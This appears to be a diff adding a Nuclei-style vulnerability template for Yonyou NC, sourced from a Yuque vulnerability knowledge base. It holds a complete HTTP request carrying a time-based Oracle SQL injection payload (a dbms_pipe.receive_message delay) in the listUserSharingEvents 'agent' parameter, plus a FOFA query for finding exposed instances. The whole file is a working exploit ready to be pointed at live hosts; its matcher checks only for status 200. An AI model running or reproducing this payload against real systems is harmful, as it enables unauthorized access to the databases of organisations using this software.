@@ -1,0 +1,31 @@
+id: poc-phdege0bibk3x51n
+info:
+  name: 用友NC listUserSharingEvents 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/phdege0bibk3x51n'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: phdege0bibk3x51n
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'GET /portal/pt/oacoSchedulerEvents/listUserSharingEvents?agent=1'')+AND+1=dbms_pipe.receive_message(''RDS'',5)--&pageId=login&sch_ed=2&sch_sd=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip, deflate
+
+    X-Requested-With: XMLHttpRequest
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
